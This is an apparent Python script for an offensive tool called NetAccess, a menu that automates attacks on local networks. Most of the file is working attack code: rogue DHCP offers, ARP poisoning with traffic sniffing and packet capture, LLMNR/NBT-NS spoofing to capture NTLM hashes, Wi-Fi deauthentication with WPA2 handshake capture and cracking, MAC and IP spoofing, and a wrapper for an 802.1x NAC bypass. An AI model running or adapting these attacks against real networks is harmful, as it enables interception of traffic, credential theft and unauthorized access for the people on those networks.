import os, subprocess
import sys
import time
import threading
from scapy.all import sniff, sendp, Ether, IP, UDP, BOOTP, DHCP, get_if_hwaddr, wrpcap, DNSQR, DNS, DNSRR
from scapy.all import ARP, Ether, send, srp, conf
from scapy.all import *
from scapy.layers.dot11 import RadioTap, Dot11, Dot11Deauth
import signal

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def print_banner():
    banner = r"""

░  ░░░░  ░░░      ░░░░      ░░░  ░░░░  ░░        ░░  ░░░░  ░░        ░░  ░░░░░░░░░      ░░░   ░░░  ░
▒  ▒▒▒▒  ▒▒  ▒▒▒▒  ▒▒  ▒▒▒▒  ▒▒  ▒▒▒  ▒▒▒▒▒▒  ▒▒▒▒▒  ▒▒▒▒  ▒▒  ▒▒▒▒▒▒▒▒  ▒▒▒▒▒▒▒▒  ▒▒▒▒  ▒▒    ▒▒  ▒
▓        ▓▓  ▓▓▓▓  ▓▓  ▓▓▓▓▓▓▓▓     ▓▓▓▓▓▓▓▓  ▓▓▓▓▓        ▓▓      ▓▓▓▓  ▓▓▓▓▓▓▓▓  ▓▓▓▓  ▓▓  ▓  ▓  ▓
█  ████  ██        ██  ████  ██  ███  ██████  █████  ████  ██  ████████  ████████        ██  ██    █
█  ████  ██  ████  ███      ███  ████  █████  █████  ████  ██        ██        ██  ████  ██  ███   █
                                                                                                    
                                    version 2 - July 2025
                     Hack and Acces to LAN networks by  @revers3vrything
    """
    print(banner)

def discovery_network():
    while True:
        print("\n[+] Discovering network...")
        print("[1] Scan all possible networks")
        print("[2] Enter a network address/range (e.g., 192.168.1.0/24)")
        print("[3] Return to main menu")

        choice = input("Select an option > ")

        if choice == '1':
            print("\n[+] Running: sudo netdiscover\n")
            subprocess.run(['sudo', 'netdiscover'])
            break
        elif choice == '2':
            range_input = input("Enter network address/range (e.g., 192.168.0.0/24): ")
            print(f"\n[+] Running: sudo netdiscover -r {range_input}\n")
            subprocess.run(['sudo', 'netdiscover', '-r', range_input])
            break
        elif choice == '3':
            break
        else:
            print("[-] Invalid option. Please try again.")

def scan_network():
    while True:
        print("\n--- Scan a Network ---")
        print("[1] Scan hosts (ping scan only)")
        print("[2] Scan ports and hosts (no ping, full scan)")
        print("[3] Scan Windows hosts using nxc")
        print("[4] Return to main menu")

        choice = input("Select an option > ")

        if choice == '1':
            network = input("Enter the network address (e.g., 192.168.1.0/24): ")
            print(f"\n[+] Running: sudo nmap -sn -n {network} -vvv\n")
            subprocess.run(['sudo', 'nmap', '-sn', '-n', network, '-vvv'])
            break

        elif choice == '2':
            network = input("Enter the network address (e.g., 192.168.1.0/24): ")
            print(f"\n[+] Running: sudo nmap -n -Pn {network} -vvv\n")
            subprocess.run(['sudo', 'nmap', '-n', '-Pn', network, '-vvv'])
            break

        elif choice == '3':
            network = input("Enter the network address (e.g., 192.168.1.0/24): ")
            print(f"\n[+] Running: nxc smb {network}\n")
            subprocess.run(['nxc', 'smb', network])
            break

        elif choice == '4':
            break

        else:
            print("[-] Invalid option. Please try again.")

def scan_host():
    while True:
        print("\n--- Scan a Host ---")
        print("[1] Only port scan")
        print("[2] Scan services")
        print("[3] Return to main menu")

        choice = input("Select an option > ")

        if choice == '1':
            ip = input("Enter the IP address of the host: ")
            print(f"\n[+] Running: sudo nmap -n -Pn {ip} -vv\n")
            subprocess.run(['sudo', 'nmap', '-n', '-Pn', ip, '-vv'])
            break
        elif choice == '2':
            ip = input("Enter the IP address of the host: ")
            print(f"\n[+] Running: sudo nmap -n -Pn -sV {ip} -vv\n")
            subprocess.run(['sudo', 'nmap', '-n', '-Pn', '-sV', ip, '-vv'])
            break
        elif choice == '3':
            break
        else:
            print("[-] Invalid option. Please try again.")

def mac_spoofing():
    interface = input("\nEnter the network interface (e.g., eth0, wlan0): ")

    while True:
        print("\n--- MAC Spoofing ---")
        print("[1] Change the MAC to a specific one")
        print("[2] Change to a random MAC")
        print("[3] Restore the original MAC")
        print("[4] Return to main menu")

        choice = input("Select an option > ")

        if choice in ['1', '2', '3']:
            print(f"\n[+] Current MAC info for {interface}:")
            subprocess.run(['sudo', 'macchanger', '-s', interface])

            print(f"[+] Bringing {interface} down...")
            subprocess.run(['sudo', 'ip', 'link', 'set', interface, 'down'])

            if choice == '1':
                new_mac = input("Enter the new MAC address (e.g., 00:11:22:33:44:55): ")
                print(f"[+] Changing MAC address of {interface} to {new_mac}")
                subprocess.run(['sudo', 'macchanger', '--mac', new_mac, interface])

            elif choice == '2':
                print(f"[+] Changing MAC address of {interface} to a random one")
                subprocess.run(['sudo', 'macchanger', '-r', interface])

            elif choice == '3':
                print(f"[+] Restoring original MAC address of {interface}")
                subprocess.run(['sudo', 'macchanger', '-p', interface])

            print(f"[+] Bringing {interface} up...")
            subprocess.run(['sudo', 'ip', 'link', 'set', interface, 'up'])

            print(f"\n[+] New MAC info for {interface}:")
            subprocess.run(['sudo', 'macchanger', '-s', interface])
            break

        elif choice == '4':
            break

        else:
            print("[-] Invalid option. Please try again.")


def ip_spoofing():
    while True:
        print("\n--- IP Spoofing ---")
        print("[1] Change the IP address manually")
        print("[2] Remove manually set IP (flush IP configuration)")
        print("[3] Return to main menu")

        choice = input("Select an option > ").strip()

        if choice == '1':
            interface = input("Enter the network interface (e.g., eth0, wlan0): ").strip()
            new_ip = input("Enter the new IP address (e.g., 192.168.1.100): ").strip()
            mask = input("Enter the subnet mask (e.g., 24): ").strip()
            gateway = input("Enter the gateway IP address (e.g., 192.168.1.1): ").strip()

            print(f"\n[+] Changing IP of {interface} to {new_ip}/{mask} with gateway {gateway}...")

            # Remove current IP addresses
            subprocess.run(['sudo', 'ip', 'addr', 'flush', 'dev', interface])

            # Set new IP address
            subprocess.run(['sudo', 'ip', 'addr', 'add', f'{new_ip}/{mask}', 'dev', interface])

            # Bring the interface up
            subprocess.run(['sudo', 'ip', 'link', 'set', interface, 'up'])

            # Set new default gateway
            subprocess.run(['sudo', 'ip', 'route', 'add', 'default', 'via', gateway, 'dev', interface])

            print(f"\n[+] New IP configuration for {interface}:")
            subprocess.run(['ip', 'addr', 'show', 'dev', interface])
            break

        elif choice == '2':
            interface = input("Enter the network interface to flush (e.g., eth0, wlan0): ").strip()
            print(f"\n[+] Flushing all IP addresses from {interface}...")

            # Flush all IP addresses
            subprocess.run(['sudo', 'ip', 'addr', 'flush', 'dev', interface])

            # Optionally bring the interface down and up to fully reset
            subprocess.run(['sudo', 'ip', 'link', 'set', interface, 'down'])
            subprocess.run(['sudo', 'ip', 'link', 'set', interface, 'up'])

            print(f"[+] IP addresses removed for interface {interface}.")
            subprocess.run(['ip', 'addr', 'show', 'dev', interface])
            break

        elif choice == '3':
            break

        else:
            print("[-] Invalid option. Please try again.")

def dhcp_spoofing():
    print("\n[+] Performing DHCP spoofing...")
    interface = input("Enter the network interface (e.g., eth0, wlan0): ")
    fake_ip = input("Enter the fake IP address to offer (e.g., 192.168.1.50): ")
    fake_gateway = input("Enter the fake gateway IP (e.g., 192.168.1.1): ")
    fake_dns = input("Enter the fake DNS server IP (e.g., 8.8.8.8): ")
    subnet_mask = input("Enter the subnet mask (e.g., 255.255.255.0): ")
    lease_time = int(input("Enter the lease time in seconds (e.g., 86400): "))

    # DHCP Offer packet builder
    def handle_dhcp_packet(pkt):
        if DHCP in pkt and pkt[DHCP].options[0][1] == 1:  # DHCP Discover
            print(f"[+] DHCP Discover received from {pkt[Ether].src}")
            # Build DHCP Offer
            offer = (
                Ether(src=get_if_hwaddr(interface), dst=pkt[Ether].src) /
                IP(src=fake_gateway, dst="255.255.255.255") /
                UDP(sport=67, dport=68) /
                BOOTP(op=2, yiaddr=fake_ip, siaddr=fake_gateway, chaddr=pkt[BOOTP].chaddr, xid=pkt[BOOTP].xid) /
                DHCP(options=[
                    ("message-type", "offer"),
                    ("server_id", fake_gateway),
                    ("lease_time", lease_time),
                    ("subnet_mask", subnet_mask),
                    ("router", fake_gateway),
                    ("name_server", fake_dns),
                    "end"
                ])
            )
            sendp(offer, iface=interface, verbose=False)
            print(f"[+] Sent fake DHCP Offer with IP {fake_ip} to {pkt[Ether].src}")

    print(f"[+] Starting DHCP spoofing on {interface}...")
    sniff(iface=interface, filter="udp and (port 67 or 68)", prn=handle_dhcp_packet, store=0)

pcap_log = []  # Global list to store captured packets

def get_mac(ip, interface):
    arp_request = ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = srp(arp_request_broadcast, timeout=2, retry=10, iface=interface, verbose=False)[0]
    if answered_list:
        return answered_list[0][1].hwsrc
    else:
        return None

def restore_arp(victim_ip, victim_mac, gateway_ip, gateway_mac, interface):
    print("\n[+] Restoring ARP tables...")
    send(ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=gateway_ip, hwsrc=gateway_mac), count=5, iface=interface, verbose=False)
    send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=victim_ip, hwsrc=victim_mac), count=5, iface=interface, verbose=False)
    print("[+] ARP tables restored.")
    # Save packets to pcap
    if pcap_log:
        filename = f"arp_poison_log_{int(time.time())}.pcap"
        wrpcap(filename, pcap_log)
        print(f"[+] Packets saved to {filename}")

def sniff_traffic(victim_ip, gateway_ip, interface):
    def packet_callback(packet):
        if IP in packet:
            src = packet[IP].src
            dst = packet[IP].dst
            if (src == victim_ip and dst == gateway_ip) or (src == gateway_ip and dst == victim_ip):
                print(f"[PACKET] {src} → {dst} | {packet.summary()}")
                pcap_log.append(packet)

    print("[*] Sniffing traffic between victim and gateway...\n")
    sniff(filter="ip", iface=interface, prn=packet_callback, store=False)

def arp_poisoning():
    print("\n[+] Performing ARP poisoning...")
    interface = input("Enter the network interface (e.g., eth0, wlan0): ")
    victim_ip = input("Enter the target (victim) IP address: ")
    gateway_ip = input("Enter the gateway IP address: ")

    print("\n[1] Automatically resolve MAC addresses")
    print("[2] Manually enter MAC addresses")
    mac_choice = input("Select MAC resolution method (1 or 2): ")

    if mac_choice == '1':
        print("[*] Resolving MAC addresses...")
        victim_mac = get_mac(victim_ip, interface)
        if victim_mac is None:
            print(f"[-] Could not find MAC address for victim IP {victim_ip}. Exiting.")
            return

        gateway_mac = get_mac(gateway_ip, interface)
        if gateway_mac is None:
            print(f"[-] Could not find MAC address for gateway IP {gateway_ip}. Exiting.")
            return

    elif mac_choice == '2':
        victim_mac = input("Enter the MAC address of the victim: ")
        gateway_mac = input("Enter the MAC address of the gateway: ")

    else:
        print("[-] Invalid selection. Exiting.")
        return

    print(f"[+] Victim MAC: {victim_mac}")
    print(f"[+] Gateway MAC: {gateway_mac}")
    print("[*] Starting ARP poisoning. Press Ctrl+C to stop and restore ARP tables.")

    # Start sniffing in a separate thread
    sniff_thread = threading.Thread(target=sniff_traffic, args=(victim_ip, gateway_ip, interface), daemon=True)
    sniff_thread.start()

    try:
        while True:
            # Spoof victim and gateway
            send(ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=gateway_ip), iface=interface, verbose=False)
            send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=victim_ip), iface=interface, verbose=False)
            time.sleep(2)
    except KeyboardInterrupt:
        restore_arp(victim_ip, victim_mac, gateway_ip, gateway_mac, interface)
        print("[+] Exiting arp_poisoning()")


def ipv6_scans():
    print("=== IPv6 Network Scanner ===")
    print("1. Scan hosts with IPv6 (Ping sweep)")
    print("2. Scan ports on a host with IPv6")
    print("3. Return to main menu")

    choice = input("Select an option: ")

    if choice == "1":
        # Example: ff02::1 is all-nodes multicast for link-local
        print("\n[!] Tip: Use link-local prefixes (fe80::/10) or global ones if known.")
        network = input("Enter IPv6 subnet or target (e.g., fe80::/64 or ff02::1): ")
        interface = input("Enter your interface (e.g., eth0): ")
        print(f"\n[*] Scanning for live hosts on {network} using {interface}...\n")
        os.system(f"sudo nmap -6 -sn -e {interface} {network} -vv")
    
    elif choice == "2":
        target = input("Enter the target IPv6 address: ")
        interface = input("Enter your interface (e.g., eth0): ")
        print(f"\n[*] Scanning open ports on {target} using {interface}...\n")
        os.system(f"sudo nmap -6 -Pn -e {interface} {target} -vv")
    
    elif choice == "3":
        return
    
    else:
        print("Invalid option.")

def llmnr_poisoning():
    iface = input("Interface for LLMNR/NBT-NS poisoning (e.g., eth0): ")

    def handle_packet(pkt):
        if pkt.haslayer(UDP) and pkt[UDP].dport in (5355, 137):
            qname = bytes(pkt[DNSQR].qname).decode('utf-8') if pkt.haslayer(DNSQR) else None
            src = pkt[IP].src
            if qname:
                print(f"[+] Intercepted name query {qname} from {src}, spoofing!")
                # Send spoofed DNS response for LLMNR
                ether = Ether(dst=pkt[Ether].src) / IP(dst=src, src=conf.iface.ip) / UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)
                dns = DNS(id=pkt[DNS].id, qr=1, opcode=0, qd=pkt[DNS].qd, an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=300, rdata=conf.iface.ip))
                resp = ether / dns
                sendp(resp, iface=iface, verbose=False)
                print(f"[+] Sent spoofed LLMNR/NBT-NS response to {src} for {qname}")

    print("[*] Starting LLMNR/NBT-NS poisoner. Ctrl+C to stop.")
    sniff(iface=iface, filter="udp port 5355 or udp port 137", prn=handle_packet, store=False)

def wifi_deauth_capture_crack():
    print("\n[*] Starting airmon-ng to discover Wi-Fi networks...")
    mon_iface = input("Enter the Wi-Fi interface (e.g., wlan1): ")

    # Start monitor mode
    print(f"[+] Enabling monitor mode on {mon_iface}...")
    subprocess.run(['sudo', 'airmon-ng', 'start', mon_iface])

    # Interface in monitor mode
    mon_iface = mon_iface + "mon"

    # Run airodump-ng to scan Wi-Fi networks
    print("\n[*] Running airodump-ng to sniff Wi-Fi networks. Press Ctrl+C when ready to stop.")
    try:
        subprocess.run(['sudo', 'airodump-ng', mon_iface])
    except KeyboardInterrupt:
        print("\n[+] Airodump-ng stopped. Proceeding to Deauth + Capture.")

    # Get inputs
    ap_mac = input("Enter AP MAC (BSSID) of target: ")
    victim_mac = input("Enter Client MAC (or 'ff:ff:ff:ff:ff:ff' for broadcast): ")
    count = int(input("Enter number of deauth packets to send: "))
    channel = input("Enter AP channel: ")
    capture_file = input("Enter capture file name (without extension): ")
    wordlist = input("Enter path to wordlist for aircrack-ng: ")

    # Build deauth packet
    deauth_pkt = RadioTap()/Dot11(addr1=victim_mac, addr2=ap_mac, addr3=ap_mac)/Dot11Deauth(reason=7)

    # Start airodump-ng in new terminal
    def capture_handshake():
        print("[*] Starting airodump-ng to capture handshake...")
        command = ['x-terminal-emulator', '-e', 'airodump-ng', mon_iface, '-c', channel, '-w', capture_file, '--bssid', ap_mac]
        try:
            subprocess.run(command)
        except FileNotFoundError:
            # Fallback
            subprocess.Popen(['sudo', 'airodump-ng', mon_iface, '-c', channel, '-w', capture_file, '--bssid', ap_mac])

    # Send deauth packets
    def send_deauth():
        print(f"[*] Sending {count} deauth packets to {victim_mac} from {ap_mac}...")
        sendp(deauth_pkt, iface=mon_iface, count=count, inter=0.1, verbose=True)
        print("[+] Deauth sent.")

    # Run airodump in thread
    t = threading.Thread(target=capture_handshake)
    t.start()

    # Give time to start airodump-ng
    time.sleep(3)
    send_deauth()

    print("[*] Wait 20–30s for handshake capture. Press ENTER when ready to stop airodump-ng and run aircrack-ng.")
    input("Press ENTER to continue...")

    # Kill airodump-ng processes
    subprocess.run(['sudo', 'pkill', 'airodump-ng'])

    # Crack handshake
    print(f"\n[*] Running aircrack-ng on {capture_file}-01.cap with wordlist...")
    cap_path = capture_file + "-01.cap"
    subprocess.run(['sudo', 'aircrack-ng', '-w', wordlist, '-b', ap_mac, cap_path])

    print("\n[+] Done.")

def change_hostname():
    new_hostname = input("Enter the new hostname: ").strip()

    if not new_hostname:
        print("[!] No hostname provided.")
        return

    try:
        # Set new hostname
        subprocess.run(["hostnamectl", "set-hostname", new_hostname], check=True)

        # Modify /etc/hosts
        with open("/etc/hosts", "r") as file:
            hosts_content = file.readlines()

        with open("/etc/hosts", "w") as file:
            for line in hosts_content:
                if line.startswith("127.0.1.1"):
                    file.write(f"127.0.1.1\t{new_hostname}\n")
                else:
                    file.write(line)

        print(f"\n[+] Hostname successfully changed to '{new_hostname}'")

        # Show current hostname
        print("\n[+] Verifying current hostname:\n")
        subprocess.run(["hostname"])

        # Open /etc/hosts in less
        print("\n[+] Showing /etc/hosts contents:\n")
        subprocess.run(["less", "/etc/hosts"])

    except subprocess.CalledProcessError as e:
        print(f"[!] Command failed: {e}")
    except Exception as e:
        print(f"[!] Error: {e}")

def run_silent_bridge():
    try:
        target_path = "silentbridge"
        venv_path = os.path.join(target_path, "myenv", "bin", "activate")

        if not os.path.isdir(target_path):
            print(f"[!] Directory {target_path} does not exist.")
            return
        if not os.path.exists(venv_path):
            print(f"[!] Virtual environment not found at {venv_path}")
            return

        print("\n=== SilentBridge Menu ===")
        print("1. Classic 802.1x Bypass Attack")
        print("2. Another attack, by default show Help ('./silentbridge -h')")
        print("0. Exit")

        choice = input("\nSelect an option: ").strip()

        if choice == "1":
            # Get user input for interface names
            upstream = input("Enter the name of the --upstream interface (e.g., eth0): ").strip()
            phy = input("Enter the name of the --phy interface (e.g., eth1): ").strip()
            sidechannel = input("Enter the name of the --sidechannel interface (e.g., eth3): ").strip()

            command = f"./silentbridge --create-bridge --upstream {upstream} --phy {phy} --sidechannel {sidechannel}"
            print(f"\n[+] Running: {command}\n")

            subprocess.call([
                "/bin/bash", "-c",
                f"cd {target_path} && source myenv/bin/activate && {command}"
            ])

        elif choice == "2":
            print(f"\n[+] Launching shell in {target_path} with virtual environment activated.")
            print("[+] Running './silentbridge -h' inside the shell.")
            print("[+] Type 'deactivate' to exit the environment, and 'exit' to leave the shell.\n")

            subprocess.call([
                "/bin/bash", "-c",
                f"cd {target_path} && source myenv/bin/activate && ./silentbridge -h; exec /bin/bash"
            ])

        elif choice == "0":
            print("[*] Exiting.")
            return

        else:
            print("[!] Invalid option selected.")

    except Exception as e:
        print(f"[!] An error occurred: {e}")



def main():
    menu = """
[1]  Discovery network
[2]  Scan a network
[3]  Scan a host
[4]  MAC Spoofing
[5]  IP Spoofing
[6]  DHCP Spoofing
[7]  ARP poisoning
[8]  IPv6 scans
[9]  Capture NTLM Hashes
[10] Capture WPA2 Handshake
[11] Hostname Spoofing
[12] Bypass NAC with Silent Bridge
[13] Exit
"""

    while True:
        print_banner()
        print(menu)
        choice = input("NetAccess > ")

        if choice == '1':
            discovery_network()
        elif choice == '2':
            scan_network()
        elif choice == '3':
            scan_host()
        elif choice == '4':
            mac_spoofing()
        elif choice == '5':
            ip_spoofing()
        elif choice == '6':
            dhcp_spoofing()
        elif choice == '7':
            arp_poisoning()
        elif choice == '8':
            ipv6_scans()
        elif choice == '9':
            llmnr_poisoning()
        elif choice == '10':
            wifi_deauth_capture_crack()
        elif choice == '11':
            change_hostname()
        elif choice == '12':
            run_silent_bridge()
        elif choice == '13':
            print("Exiting NetAccess. Goodbye!")
            sys.exit(0)
        else:
            print("Invalid option. Please choose a valid number from the menu.")

        input("\nPress Enter to return to menu...")
        clear()

if __name__ == "__main__":
    main()
